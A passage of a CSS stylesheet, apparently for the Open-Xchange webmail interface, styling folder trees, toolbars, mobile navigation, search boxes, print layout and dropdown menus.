            vertical-align: top;
        }

        .folder-tree .folder-node.show-counter .folder-counter {
            display: inline-block;
        }

        .folder-tree .folder-node .folder-options {
            padding: 0 12px;
            line-height: 23px;
            background-color: rgba(0, 0, 0, 0.05);
            outline: 0;
            display: none;
        }

        .folder-tree .folder-node .folder-options i {
            line-height: inherit;
        }

        .folder-tree .folder-node .folder-options:focus {
            background-color: #e9f0fa;
        }

        .folder-tree .folder-node .folder-options:focus i {
            color: white;
        }

        .folder-tree .folder-node .folder-icon {
            display: none;
        }

        .folder-tree .folder-node .folder-icon.visible {
            display: inline-block;
            margin: 0 12px 0 0;
        }

        .folder-tree .folder-node .folder-icon i:not(.file-type-icon) {
            text-align: left;
        }

        .folder-tree .folder-node .folder-icon i:not(.file-type-icon):before {
            content: "\f114";
        }

        .folder-tree .folder-node .folder-icon.inbox i:before {
            content: "\f01c";
        }

        .folder-tree .folder-node .folder-icon.unseen i:before {
            content: "\f0e0";
        }

        .folder-tree .folder-node .folder-icon.sent i:before {
            content: "\f1d8";
        }

        .folder-tree .folder-node .folder-icon.drafts i:before {
            content: "\f15b";
        }

        .folder-tree .folder-node .folder-icon.trash i:before {
            content: "\f1f8";
        }

        .folder-tree .folder-node .folder-icon.spam i:before {
            content: "\f05e";
        }

        .folder-tree .folder-node .folder-icon.archive i:before {
            content: "\f187";
        }

        .folder-tree .folder-node .folder-icon.default i {
            color: #aaa;
        }

        .folder-tree .folder-node .folder-icon.myshares i:before {
            content: "\f0c2";
        }

        .folder-tree .folder-node .folder-icon.attachments i:before {
            content: "\f0c6";
        }

        .folder-tree .folder-node .folder-icon.myfiles i:before {
            content: "\f007";
        }

        .folder-tree .folder-node .folder-icon.myfavorites i:before {
            content: "\f005";
        }

        .folder-tree .folder-node .folder-checkbox {
            display: inline-block;
            margin: 0 16px 0 0;
        }

        .folder-tree .folder-node .folder-shared {
            padding: 2px;
            color: rgba(0, 0, 0, 0.3);
        }

        .folder-tree .folder-node .folder-shared:before {
            content: "\f007";
        }

        .folder-tree .folder-node .folder-sub {
            padding: 2px;
            color: rgba(0, 0, 0, 0.3);
        }

        .folder-tree .folder-node .folder-sub:before {
            content: "\f0c2";
        }

        .folder-tree .folder.open>.folder-node>.folder-icon.default i:before {
            content: "\f115";
        }

        .folder-tree .subfolders {
            margin: 0;
            padding: 0;
            list-style-type: none;
            display: none;
        }

        .folder-tree .folder.open>.subfolders {
            display: block;
        }

        .folder-tree .favorites,
        .folder-tree .unified-folders,
        .folder-tree .standard-folders,
        .folder-tree .myshares,
        .folder-tree .root-folders,
        .folder-tree .private-drive-folders,
        .folder-tree .public-drive-folders,
        .folder-tree .filestorage-folders,
        .folder-tree .remote-folders {
            margin-bottom: 16px;
        }

        @media (max-width: 540px),
        (max-device-width: 540px) {

            .folder-tree .favorites,
            .folder-tree .unified-folders,
            .folder-tree .standard-folders,
            .folder-tree .myshares,
            .folder-tree .root-folders,
            .folder-tree .private-drive-folders,
            .folder-tree .public-drive-folders,
            .folder-tree .filestorage-folders,
            .folder-tree .remote-folders {
                margin-bottom: 0;
            }
        }

        .folder-tree .folder.section.open {
            margin-bottom: 16px;
        }

        .folder-tree .folder.section:first-child {
            margin-top: 0;
        }

        .folder-tree .folder.section>.folder-node>.folder-label {
            font-weight: 700;
        }

        .folder-tree .selected>.folder-node>.folder-label {
            font-weight: 700;
            vertical-align: top;
        }

        .folder-tree .selected>.folder-node>.folder-label>div {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .folder-tree .flat-tree .folder-label {
            min-width: 150px;
        }

        .folder-tree .flat-tree .selected>.folder-node>.folder-label {
            width: 150px;
        }

        .folder-tree .links {
            list-style-type: none;
            margin: 16px 0 0 0;
            padding: 0 16px 16px 40px;
            font-size: 13px;
            line-height: 24px;
            font-weight: 400;
        }

        .folder-tree .links:empty {
            margin: 0;
            padding: 0;
        }

        .folder-tree .links ul {
            margin-top: -1px;
            padding-bottom: 1px;
        }

        .folder-tree .folder.section+.links {
            margin: 16px 0 16px 40px;
            padding: 0;
            line-height: 24px;
        }

        .folder-tree .folder.section+.links:empty {
            margin: 0;
        }

        .mobile-edit-mode .folder-tree .selectable[data-contextmenu] .folder-label {
            color: #07b;
            text-decoration: underline;
        }

        .io-ox-dialog-popup .has-error .btn-new-account {
            color: #a94442;
            border-color: #a94442;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        }

        .smartphone .folder-tree {
            padding-left: 20px;
        }

        .smartphone .folder-tree .folder {
            line-height: 48px;
        }

        .smartphone .folder-tree .folder-icon {
            float: left;
        }

        .smartphone .folder-tree .folder-node {
            height: 48px;
        }

        .smartphone .folder-tree .folder-node .folder-arrow {
            font-size: 20px;
            position: absolute;
            right: 0;
            text-align: center;
            padding-left: 0;
        }

        .smartphone .folder-tree .folder-node .folder-arrow .fa-caret-down:before {
            content: "\f0d7";
        }

        .smartphone .folder-tree .folder-node .folder-label,
        .smartphone .folder-tree .folder-node .folder-counter,
        .smartphone .folder-tree .folder-node .folder-options {
            font-size: 15px;
        }

        .smartphone .folder-tree .folder-node .folder-label>div {
            max-width: 320px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .smartphone .folder-tree .folder-node .folder-buttons {
            vertical-align: top;
        }

        .smartphone .folder-tree li[data-id="virtual/settings"] .folder-node .folder-label>div {
            max-width: 280px;
        }

        .smartphone .folder-tree .folder.section+.links {
            margin-left: 0px;
        }

        .smartphone .folder-tree .links {
            font-size: 16px;
            padding-left: 0;
        }

        .smartphone .folder-tree .links a {
            margin-bottom: 8px;
        }

        .smartphone .folder-tree .flat-tree .folder-label {
            min-width: 160px;
        }

        .smartphone .folder-tree .flat-tree .selected>.folder-node>.folder-label {
            width: 160px;
        }

        .fadein {
            -webkit-perspective: 1000;
            -webkit-backface-visibility: hidden;
            -webkit-animation: fadein 300ms;
        }

        .fadein.fast {
            -webkit-animation: fadein 150ms;
        }

        .fadeout {
            -webkit-perspective: 1000;
            -webkit-backface-visibility: hidden;
            -webkit-animation: fadeout 300ms;
        }

        .fadeout.fast {
            -webkit-animation: fadeout 150ms;
        }

        @-webkit-keyframes fadein {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @-webkit-keyframes fadeout {
            from {
                opacity: 1;
            }

            to {
                opacity: 0;
            }
        }

        .legacy-chrome .animate-moveleft {
            -webkit-transform: none;
            -webkit-transition-property: none;
            -webkit-transition-duration: none;
            left: 0;
        }

        .legacy-chrome .animate-moveright {
            -webkit-transform: none;
            -webkit-transition-property: none;
            -webkit-transition-duration: none;
            left: 90%;
        }

        .fix-spin .fa-spin {
            filter: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'><filter id='grayscale'><feColorMatrix type='saturate' values='1'/></filter></svg>#grayscale");
        }

        @media (max-width: 540px) and (orientation: portrait),
        (max-height: 540px) and (orientation: landscape) {
            .animate-moveright {
                -webkit-transform: translateX(90%);
                -webkit-transition-property: -webkit-transform;
                -webkit-transition-duration: 300ms;
            }

            .animate-moveleft {
                -webkit-transform: translateX(0);
                -webkit-transition-property: -webkit-transform;
                -webkit-transition-duration: 300ms;
            }
        }

        .statistics {
            position: static;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
        }

        .statistics.modal-body {
            padding: 28px 28px 0 28px;
        }

        .statistics h1.folder-name {
            font-size: 24px;
            text-transform: uppercase;
            margin: 0 0 24px 0;
        }

        .statistics header,
        .statistics section {
            margin: 0 0 28px 0;
        }

        .statistics header:last-child,
        .statistics section:last-child {
            margin-bottom: 0;
        }

        .statistics .folder-summary {
            color: #888;
        }

        .statistics .folder-actions {
            margin-top: 14px;
        }

        .statistics h2 {
            font-size: 20px;
            line-height: 24px;
            font-weight: 300;
            margin: 0 0 14px 0;
        }

        .statistics ul.compact li a.disabled,
        .statistics ul.compact li.divider {
            display: none;
        }

        .statistics canvas {
            margin-bottom: 10px;
        }

        .inline-link {
            color: #07b;
            text-decoration: none;
        }

        .inline-link:hover {
            text-decoration: none;
        }

        .io-ox-inline-links {
            font-size: 14px;
            font-weight: normal;
            margin: 18px 0;
            clear: both;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            min-height: 20px;
        }

        .io-ox-inline-links a:hover {
            text-decoration: none;
        }

        .io-ox-inline-links>li {
            display: inline-block;
            white-space: nowrap;
            margin-right: 22px;
            list-style-type: none;
        }

        .io-ox-inline-links.embedded {
            margin: 1em 0;
            text-align: right;
        }

        .io-ox-inline-links.embedded .io-ox-action-link {
            margin: 0 0 0 22px;
        }

        .io-ox-inline-links.empty {
            padding: 0;
            min-height: 0;
        }

        .io-ox-inline-links>a,
        .io-ox-inline-links>li.dropdown {
            color: #07b;
            text-decoration: none;
        }

        .io-ox-inline-links>a:hover,
        .io-ox-inline-links>li.dropdown:hover {
            text-decoration: none;
        }

        .io-ox-inline-links>a li,
        .io-ox-inline-links>li.dropdown li {
            margin-right: 0;
        }

        .io-ox-inline-links li.dropdown ul {
            text-align: left;
        }

        .io-ox-inline-links li.dropdown .caret {
            margin-right: 5px;
        }

        ul.io-ox-inline-links+header {
            position: relative;
            z-index: 2;
        }

        .io-ox-inline-buttongroup {
            font-size: 14px;
            font-weight: normal;
            margin: 18px 0;
            clear: both;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            min-height: 20px;
            margin: 0 0 0 0;
        }

        .io-ox-inline-buttongroup a:hover {
            text-decoration: none;
        }

        .io-ox-inline-buttongroup>li {
            display: inline-block;
            white-space: nowrap;
            margin-right: 22px;
            list-style-type: none;
        }

        .io-ox-inline-buttongroup.embedded {
            margin: 1em 0;
            text-align: right;
        }

        .io-ox-inline-buttongroup.embedded .io-ox-action-link {
            margin: 0 0 0 22px;
        }

        .io-ox-inline-buttongroup.empty {
            padding: 0;
            min-height: 0;
        }

        .io-ox-inline-buttongroup>a,
        .io-ox-inline-buttongroup>li.dropdown {
            color: #07b;
            text-decoration: none;
        }

        .io-ox-inline-buttongroup>a:hover,
        .io-ox-inline-buttongroup>li.dropdown:hover {
            text-decoration: none;
        }

        .io-ox-inline-buttongroup>a li,
        .io-ox-inline-buttongroup>li.dropdown li {
            margin-right: 0;
        }

        .io-ox-inline-buttongroup li.dropdown ul {
            text-align: left;
        }

        .io-ox-inline-buttongroup li.dropdown .caret {
            margin-right: 5px;
        }

        .io-ox-inline-buttongroup .io-ox-action-link {
            margin-right: 0;
        }

        .io-ox-inline-buttongroup a:hover {
            text-decoration: none;
        }

        .io-ox-action-link.btn-primary {
            color: white;
            font-weight: normal;
        }

        .io-ox-action-link.btn-primary:hover {
            text-decoration: none;
        }

        .io-ox-action-link.disabled {
            color: #aaa;
            cursor: not-allowed;
        }

        .io-ox-action-link:last-child {
            margin-right: 0;
        }

        .multi-selection-message {
            display: table;
        }

        .multi-selection-message .message {
            color: #757575;
            font-weight: 300;
            font-size: 16px;
        }

        .multi-selection-message .message .number {
            font-weight: bold;
            font-size: 20px;
        }

        .multi-selection-message .inline-actions {
            font-size: 14px;
            font-weight: normal;
            margin: 32px auto 0 auto;
            max-width: 500px;
            background-color: #fff6db;
            padding: 16px;
            border: 1px solid #ffbf00;
            border-radius: 4px;
        }

        .io-ox-multi-selection .box {
            width: 300px;
            max-width: 500px;
            margin: 0 auto;
            text-align: left;
            display: table;
        }

        .io-ox-multi-selection .summary {
            font-size: 28px;
            font-weight: 300;
            line-height: 1.2em;
            color: #ccc;
        }

        .io-ox-multi-selection .summary.empty {
            font-size: 14px;
            color: #767676;
            font-weight: normal;
        }

        .io-ox-multi-selection .summary b {
            color: #aaa;
        }

        .io-ox-multi-selection .io-ox-inline-links {
            margin: 28px 0;
        }

        .io-ox-multi-selection .io-ox-inline-links a {
            color: #07b;
        }

        .io-ox-multi-selection .io-ox-inline-links.empty {
            display: none;
        }

        .io-ox-multi-selection .io-ox-action-link {
            display: block;
        }

        .io-ox-multi-selection .io-ox-action-link.disabled {
            display: none;
        }

        .inline-buttons {
            margin: 13px 0 13px 0;
            height: 30px;
        }

        .inline-buttons.top {
            margin-top: 0;
        }

        .inline-buttons .btn {
            float: right;
            margin-left: 13px;
        }

        a.attachment-link {
            color: #333;
            word-break: break-all;
        }

        a.attachment-link:hover {
            color: #000;
        }

        .toolbar-button {
            font-size: 22px;
            line-height: 52px;
            margin: 4px 0 8px 0;
            display: block;
        }

        .toolbar-button ul {
            font-size: 14px;
            line-height: 20px;
        }

        .toolbar-button>a {
            width: 50px;
            text-align: center;
            height: 52px;
            display: inline-block;
            outline: 0;
        }

        .toolbar-button>a i {
            color: #bbb;
        }

        .toolbar-button>a i.accent-color {
            background-color: #07b;
            color: #fff;
            border: 2px solid #07b;
            width: 29px;
            border-radius: 3px;
            padding-top: 2px;
            display: inline-block;
        }

        .toolbar-button>a:hover {
            text-decoration: none !important;
        }

        .toolbar-button>a:hover i {
            color: #888;
            text-decoration: none;
        }

        .toolbar-button>a:hover i.accent-color {
            background-color: #005788;
            border-color: #005788;
        }

        @media (min-width: 541px),
        (min-device-width: 541px) {
            .toolbar-button>a:focus {
                color: #888;
                text-decoration: none;
                background-color: #f80;
            }

            .toolbar-button>a:focus i {
                color: white;
                text-decoration: none;
            }

            .toolbar-button>a:focus i.accent-color {
                background-color: #f80;
                border-color: #f80;
            }
        }

        .toolbar-button>a.disabled i {
            color: #eee;
            cursor: default;
        }

        .toolbar-button>a.disabled i.accent-color {
            background-color: #fff;
            border-color: #fff;
        }

        .mobile-navbar {
            text-align: center;
            font-size: 16px;
        }

        .mobile-navbar .navbar-action {
            position: absolute;
            top: 14px;
            max-width: 24%;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .mobile-navbar .navbar-action.left {
            left: 10px;
        }

        .mobile-navbar .navbar-action.left .fa-chevron-left {
            text-align: left;
            width: 15px;
        }

        .mobile-navbar .navbar-action a,
        .mobile-navbar .navbar-action a:hover {
            color: #07b;
            transition: opacity 180ms;
            opacity: 1;
            text-decoration: none;
        }

        .tapped .mobile-navbar .navbar-action a,
        .tapped .mobile-navbar .navbar-action a:hover {
            opacity: 0.5;
        }

        .mobile-navbar .navbar-action.right {
            right: 15px;
        }

        .mobile-navbar .navbar-action.right .fa-chevron-right {
            margin-left: 4px;
        }

        .mobile-navbar .navbar-title {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            margin: 14px 24%;
            font-weight: 500;
        }

        .mobile-toolbar {
            position: fixed;
            bottom: 0;
            background-color: #fff;
            height: 50px;
            z-index: 10;
            margin: 0;
            border-top: 1px solid #ccc;
            width: 100%;
        }

        .mobile-toolbar .list-unstyled>li,
        .mobile-toolbar .io-ox-action-link.mobile-toolbar-action {
            display: inline-block;
            font-size: 22px;
            line-height: 50px;
            width: 19.9%;
            height: 50px;
            text-align: center;
            margin: 0;
            vertical-align: middle;
        }

        .mobile-toolbar .list-unstyled>li.text-button,
        .mobile-toolbar .io-ox-action-link.mobile-toolbar-action.text-button {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-size: 18px;
        }

        .mobile-toolbar .inline-toolbar {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-direction: row;
            height: 48px;
        }

        .mobile-toolbar .inline-toolbar>li {
            width: 20%;
            height: 100%;
            margin: 0;
        }

        .mobile-toolbar .inline-toolbar>li>a {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
        }

        .mobile-toolbar .inline-toolbar>li>a:focus:not(.disabled) {
            background: transparent;
            color: #07b;
        }

        .mobile-toolbar .inline-toolbar>li>a.disabled {
            text-decoration: none;
        }

        .mobile-toolbar .inline-toolbar>li>a.disabled:focus {
            background: transparent;
        }

        .mobile-toolbar .inline-toolbar i.fa {
            font-size: 22px;
        }

        .mobile-toolbar .inline-toolbar .dropdown {
            line-height: auto;
        }

        .smartphone .classic-toolbar-visible .window-content,
        .abs.below-toolbar {
            top: 50px;
        }

        .classic-toolbar-visible .window-content,
        .abs.below-toolbar {
            top: 40px;
        }

        .bottom-toolbar.bottom-toolbar-visible .window-content {
            bottom: 40px;
        }

        .chromeless-window .window-body:not(.mobile-toolbar-visible) {
            bottom: 0;
        }

        .chromeless-window .window-body.mobile-toolbar-visible {
            bottom: 50px;
        }

        .chromeless-window.header-bottom .window-body:not(.mobile-toolbar-visible) {
            bottom: 64px;
        }

        .smartphone .mobile-navbar {
            height: 50px;
        }

        .classic-toolbar,
        .mobile-navbar {
            position: absolute;
            top: 0;
            width: 100%;
            height: 40px;
            background-color: #fff;
            border-bottom: 1px solid #ddd;
            margin: 0;
            padding: 0;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .classic-toolbar>li,
        .mobile-navbar>li {
            list-style: none;
            display: inline-block;
            padding: 0;
            float: left;
            height: 100%;
        }

        .classic-toolbar>li>a.upsell i.upsell-icon,
        .mobile-navbar>li>a.upsell i.upsell-icon {
            color: #ffc107;
            margin-left: 4px;
            font-size: 14px;
        }

        .classic-toolbar>li>a,
        .mobile-navbar>li>a,
        .classic-toolbar>li>button,
        .mobile-navbar>li>button {
            height: 100%;
            display: inline-block;
            line-height: 22px;
            padding: 8px 16px;
            text-decoration: none;
            float: left;
            outline: 0;
        }

        .classic-toolbar>li>a i,
        .mobile-navbar>li>a i,
        .classic-toolbar>li>button i,
        .mobile-navbar>li>button i {
            text-decoration: none;
        }

        .classic-toolbar>li>a:focus,
        .mobile-navbar>li>a:focus,
        .classic-toolbar>li>button:focus,
        .mobile-navbar>li>button:focus {
            background-color: #eee;
            text-decoration: none;
        }

        .classic-toolbar>li>a.disabled,
        .mobile-navbar>li>a.disabled,
        .classic-toolbar>li>button.disabled,
        .mobile-navbar>li>button.disabled {
            color: #aaa;
            cursor: not-allowed;
        }

        @media (max-width: 580px) {

            .classic-toolbar>li>a,
            .mobile-navbar>li>a,
            .classic-toolbar>li>button,
            .mobile-navbar>li>button {
                padding: 8px 14px;
            }
        }

        .classic-toolbar>li>button,
        .mobile-navbar>li>button {
            font-size: 13px;
            text-align: left;
        }

        .classic-toolbar>li.pull-right,
        .mobile-navbar>li.pull-right {
            float: right;
        }

        .classic-toolbar>li.pull-right>.dropdown-menu,
        .mobile-navbar>li.pull-right>.dropdown-menu {
            right: 4px;
        }

        .align-right>.classic-toolbar,
        .align-right>.mobile-navbar {
            display: flex;
        }

        .align-right>.classic-toolbar li.align-left+li:not(.align-left),
        .align-right>.mobile-navbar li.align-left+li:not(.align-left) {
            margin-left: auto;
        }

        .inline-toolbar {
            padding: 0;
            margin: 4px 8px 0 -8px;
            min-height: 32px;
            clear: both;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .inline-toolbar>li {
            display: inline-block;
            white-space: nowrap;
            margin-right: 8px;
            list-style-type: none;
        }

        .inline-toolbar>li>a {
            padding: 4px 8px;
            display: inline-block;
        }

        .inline-toolbar>li>a:focus {
            background: #f80;
            color: #fff;
            outline: 0;
            text-decoration: none;
        }

        .inline-toolbar>li>a.upsell i.upsell-icon {
            color: #ffc107;
            margin-left: 4px;
            font-size: 14px;
        }

        .inline-toolbar>li a.disabled {
            color: #aaa;
            cursor: not-allowed;
        }

        .inline-toolbar .fa-bars {
            font-size: 14px;
        }

        .io-ox-sidepopup-pane .inline-toolbar {
            margin-top: 0;
        }

        .window-toolbar>ul {
            margin: 0;
        }

        .window-toolbar>a {
            color: #ffc380;
            display: inline-block;
            margin: 0 1em 0 0;
            cursor: pointer;
            white-space: nowrap;
            text-decoration: none;
            outline: 0;
        }

        .window-toolbar>a:hover {
            color: #ffac4d;
        }

        .window-toolbar .dropdown-menu {
            text-align: left;
        }

        .window-toolbar .dropdown-menu a {
            margin-right: 0;
        }

        .touch .window-toolbar a {
            outline: 0;
        }

        .window-toolbar .btn {
            font-size: 13px;
        }

        .window-toolbar .btn-group+.btn-group {
            margin-left: 15px;
        }

        .window-toolbar .btn-primary+.btn-primary {
            margin-left: 10px;
        }

        .window-toolbar a.btn-primary,
        .window-toolbar a.btn-primary:hover {
            color: white;
            font-size: 13px;
            line-height: 18px;
            text-decoration: none;
        }

        .window-toolbar a:hover,
        .window-toolbar a.button:hover {
            text-decoration: underline;
        }

        .generic-toolbar {
            position: absolute;
            width: 100%;
            height: 40px;
            padding: 0;
            background-color: #fff;
            border: 0 solid #e4e4e4;
            font-size: 14px;
            line-height: 39px;
        }

        .generic-toolbar.top {
            top: 0;
            border-bottom-width: 1px;
        }

        .generic-toolbar.bottom {
            bottom: 0;
            border-top-width: 1px;
            z-index: 1;
        }

        .generic-toolbar .toolbar-item {
            color: #333;
            display: inline-block;
            float: left;
            line-height: 39px;
            padding: 0 16px;
            text-decoration: none;
        }

        .generic-toolbar .toolbar-item .folder-up.fa-stack .fa-level-up {
            -webkit-transform: scale(-1.2, 1) translate(4px, 0);
            -ms-transform: scale(-1.2, 1) translate(4px, 0);
            transform: scale(-1.2, 1) translate(4px, 0);
        }

        .generic-toolbar .io-ox-context-help {
            float: right;
            padding-left: 16px;
            padding-right: 16px;
        }

        .generic-toolbar.visual-focus .toolbar-item {
            outline: 0;
        }

        .generic-toolbar.visual-focus .toolbar-item:hover {
            color: #555;
            background-color: rgba(0, 0, 0, 0.05);
        }

        .generic-toolbar.visual-focus .toolbar-item:focus {
            color: #fff;
            background-color: #f80;
        }

        .generic-toolbar.visual-focus .toolbar-item:focus>i {
            color: #fff;
        }

        .generic-toolbar .toolbar-item.pull-right>.dropdown-menu {
            right: 4px;
        }

        .generic-toolbar.toolbar-small {
            height: 30px;
            line-height: 29px;
        }

        .generic-toolbar.toolbar-small .toolbar-item {
            line-height: 29px;
        }

        .secondary-toolbar {
            font-size: 13px;
            overflow: hidden;
        }

        @media (max-width: 540px) and (orientation: portrait),
        (max-height: 540px) and (orientation: landscape) {
            .toolbar-button {
                margin: 0;
            }

            #multi-select-toolbar .select-counter {
                margin-left: 15px;
                font-weight: bold;
                color: #aaa;
            }
        }

        .window-container .io-ox-find {
            padding: 4px 8px;
            line-height: 20px;
            z-index: 10;
        }

        .window-container .io-ox-find .search-box ::-ms-clear {
            display: none;
            width: 0;
            height: 0;
        }

        .window-container .io-ox-find .search-box .action.io-ox-busy {
            position: absolute;
            line-height: 22px;
        }

        .window-container .io-ox-find .search-box .action.io-ox-busy:before {
            font-size: 16px;
        }

        .window-container .io-ox-find .search-box .tokenfield-placeholder {
            padding-left: 7px;
        }

        .window-container .io-ox-find .search-box .tokenfield {
            padding-left: 4px;
            padding-right: 9px;
        }

        .window-container .io-ox-find .search-box .tokenfield .token .token-type,
        .window-container .io-ox-find .search-box .tokenfield .token .token-detail,
        .window-container .io-ox-find .search-box .tokenfield .token .fa-caret-down {
            color: rgba(0, 0, 0, 0.75);
        }

        .window-container .io-ox-find .search-box .tokenfield .token .close {
            color: rgba(0, 0, 0, 0.55);
        }

        .window-container .io-ox-find .search-box .tokenfield .token .close:hover {
            color: rgba(0, 0, 0, 0.75);
        }

        .window-container .io-ox-find .search-box .tokenfield .token .token-name {
            color: #555;
            font-weight: 500;
        }

        .window-container .io-ox-find .search-box .tokenfield .token .dropdown [data-toggle="dropdown"] {
            outline: 0;
        }

        .window-container .io-ox-find .search-box .tokenfield .token .dropdown .fa-caret-down {
            margin-left: 4px;
            margin-right: 8px;
        }

        .window-container .io-ox-find .search-box .tokenfield .token .dropdown .dropdown-menu {
            position: fixed;
        }

        .window-container .io-ox-find .search-box .action {
            pointer-events: auto;
            color: #767676;
            padding-right: 23px;
        }

        .window-container .io-ox-find .search-box .action:hover {
            color: #07b;
        }

        .window-container .io-ox-find .search-box .action:focus {
            outline: 0;
            background: #e9f0fa;
            color: #f0faff;
            border-radius: 0 3px 3px 0;
        }

        .window-container .io-ox-find .search-box-filter {
            float: left;
            padding-left: 8px;
        }

        .window-container .io-ox-find .search-box-filter>.classic-toolbar .dropdown .conflicting,
        .window-container .io-ox-find .search-box-filter>.classic-toolbar .dropdown.conflicting a {
            color: #a4a4a4;
            pointer-events: none;
        }

        .window-container .io-ox-find {
            flex: 0 1 auto;
        }

        .window-container .io-ox-find .search-box .action.action-find {
            display: inline-block;
        }

        .window-container .io-ox-find .search-box .action.action-cancel {
            display: none;
        }

        .window-container .io-ox-find .search-box-filter {
            display: none;
        }

        .window-container.io-ox-find-active:not(.mail-categories-visible) .window-body {
            transition: top 0.2s;
        }

        .window-container.io-ox-find-active .folder-tree {
            margin-top: 40px;
        }

        .window-container.io-ox-find-active .breadcrumb-ellipsis {
            display: none;
        }

        .window-container.io-ox-find-active .io-ox-find {
            position: absolute;
            width: 100vw;
            height: 40px;
        }

        .window-container.io-ox-find-active .io-ox-find .search-box {
            float: left;
            width: 100%;
            max-width: 550px;
        }

        .window-container.io-ox-find-active .io-ox-find .search-box .action.action-show {
            display: none;
        }

        .window-container.io-ox-find-active .io-ox-find .search-box .action.action-cancel {
            display: inline-block;
        }

        .window-container.io-ox-find-active .io-ox-find .search-box-filter {
            display: block;
        }

        .window-container.io-ox-find-active .io-ox-find .search-box-filter .classic-toolbar {
            width: calc(100% - 566px);
        }

        #io-ox-windowmanager .io-ox-windowmanager-sticky-panel {
            top: 0;
            max-height: 100%;
        }

        #io-ox-windowmanager.io-ox-find-active .io-ox-windowmanager-sticky-panel {
            transition: max-height 0.2s, top 0.2s;
            top: 40px;
            max-height: calc(100% - 40px);
        }

        @media print {

            .atb,
            .rightside.selection-one,
            .rightside.selection-empty {
                position: static;
            }

            .window-body {
                left: 0 !important;
            }

            #io-ox-screens,
            .abs.window-content {
                top: 0 !important;
            }

            #io-ox-appcontrol,
            #io-ox-topbar,
            .window-sidepanel,
            .categories-toolbar-container,
            .classic-toolbar-container,
            .leftside.selection-one,
            .leftside.selection-empty,
            .back-navigation,
            ul.actions,
            .toggle-all,
            .contact-picture,
            .unread-toggle,
            .show-all-recipients,
            .io-ox-alert {
                display: none !important;
            }

            .rightside.selection-empty .thread-view-list,
            .rightside.selection-one .thread-view-list,
            .rightside.selection-one,
            .rightside.selection-empty {
                padding: 0 !important;
                overflow: visible !important;
            }

            .rightside.selection-empty .thread-view.list-view .list-item,
            .rightside.selection-one .thread-view.list-view .list-item {
                margin-bottom: 0;
                border-bottom: 1px solid #ddd;
            }

            .rightside.selection-empty .detail-view-header,
            .rightside.selection-one .detail-view-header {
                padding-left: 16px !important;
            }

            .rightside.selection-empty .detail-view-header .recipients .io-ox-label,
            .rightside.selection-one .detail-view-header .recipients .io-ox-label,
            .rightside.selection-empty .detail-view-header .recipients .person-link,
            .rightside.selection-one .detail-view-header .recipients .person-link,
            .rightside.selection-empty .detail-view-header .recipients .delimiter,
            .rightside.selection-one .detail-view-header .recipients .delimiter {
                display: inline-block !important;
            }

            .rightside.selection-multiple {
                display: none !important;
            }

            .leftside.selection-multiple {
                position: static !important;
                width: 100% !important;
                border-right: none !important;
            }

            .leftside.selection-multiple .toolbar,
            .leftside.selection-multiple .list-item,
            .leftside.selection-multiple .list-item-checkmark {
                display: none !important;
            }

            .leftside.selection-multiple .list-item.selected {
                display: block !important;
                padding-left: 16px;
                padding-right: 16px;
            }

            .io-ox-mail-window .abs,
            .io-ox-mail-window .window-container,
            .io-ox-mail-window .window-body {
                position: static;
            }

            .io-ox-contacts-window .leftside,
            .io-ox-tasks-window .leftside {
                display: none !important;
            }

            .io-ox-contacts-window .rightside,
            .io-ox-tasks-window .rightside {
                left: 0 !important;
            }
        }

        .dropdown a i.fa-caret-down {
            color: inherit;
            display: inline-block;
            margin-left: 5px;
        }

        .dropdown-menu.dropdown-right {
            right: 4px;
            left: auto;
        }

        .dropdown-menu.dropdown-right-side {
            top: 15%;
            left: 42px;
        }

        .dropdown-menu>li>a:focus,
        .dropdown-menu>[role="group"]>li>a:focus {
            color: #f0faff;
            background: #e9f0fa;
            outline: 0;
        }

        .dropdown-menu>[role="group"]>li>a:hover {
            text-decoration: none;
            color: #262626;
            background-color: #f5f5f5;
        }

        .dropdown-menu>li>a,
        .dropdown-menu>[role="group"]>li>a {
            display: block;
            padding: 3px 20px;
            clear: both;
            font-weight: normal;
            line-height: 1.42857143;
            color: #333333;
            white-space: nowrap;
        }

        .dropdown-menu>li i.upsell-icon {
            color: #ffc107;
            margin-left: 4px;
            font-size: 14px;
        }

        .dropdown-menu-right>li>li.io-ox-upsell-link>a {
            padding: 3px 20px;
            white-space: nowrap;
        }

        .dropdown-header,
        .dropdown-footer {
            display: block;
            cursor: default;
            max-width: 230px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .dropdown-header {
            display: block;
            padding: 3px 20px;
            font-size: 12px;
            line-height: 1.42857143;
            color: #767676;
        }

        .dropdown-header.dropdown-description {
            min-width: 200px;
            white-space: normal;
            cursor: pointer;
        }

        .dropdown-footer {
            padding: 6px 20px 3px 20px;
            border-top: 1px solid #ddd;
            margin-top: 6px;
        }

        .dropdown li {
            display: block;
            text-shadow: none;
        }

        .dropdown li a>.fa {
            width: 2em;
            text-align: left;
        }

        .dropdown li a:not(.folder-default-color) .checkbox-color:not(.color-label) {
            width: 1em;
            margin-right: 1em;
            border-radius: 3px;
        }

        .dropdown li .fa-none:before {
            content: "\00a0";
        }

        .dropdown li small {
            font-size: 12px;
            color: #777;
        }

        .dropdown a:hover,
        .dropdown a:focus {
            text-decoration: none;
        }

        .dropdown a b.caret {
            color: #333;
        }

        .dropdown button.btn.btn-link .fa-caret-down {
            margin-left: 5px;
        }

        .attachment-list .dropdown {
            margin-right: 1em;
        }

        ul.dropdown-menu li a.disabled {
            color: #999;
        }

        .context-dropdown {
            position: fixed;
            top: 0;
